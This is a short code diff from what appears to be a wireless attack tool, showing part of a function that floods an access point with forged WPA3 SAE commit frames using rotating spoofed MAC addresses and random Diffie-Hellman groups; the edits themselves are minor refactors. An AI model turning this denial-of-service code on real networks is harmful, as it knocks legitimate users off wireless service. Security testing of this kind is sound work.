@@ -88,12 +88,12 @@ void run_attack(RunStatus &rs) {
 	dos_helpers::timed_burst(
 			sender, attack_time, static_cast<size_t>(burst_size), 10'000'000UL, [&]() -> optional<RadioTap> {
 				const auto &sta_mac = mac_pool[mac_idx % mac_pool.size()];
-				++mac_idx;
+				mac_idx++;
 				sae_params->group_id = random_dh ? DH_GROUPS[group_dist(rng)] : DH_GROUPS[0];
 				return make_sae_commit(ap.get(SK::mac), sta_mac, sae_params.value());
 			});
 	rs.process_manager.write_log_all(ATTACK_STOP_tag);
-	ap->conn->disconnect();
+	ap->disconnect();
 }
 
 void stats_attack(const RunStatus &rs) {
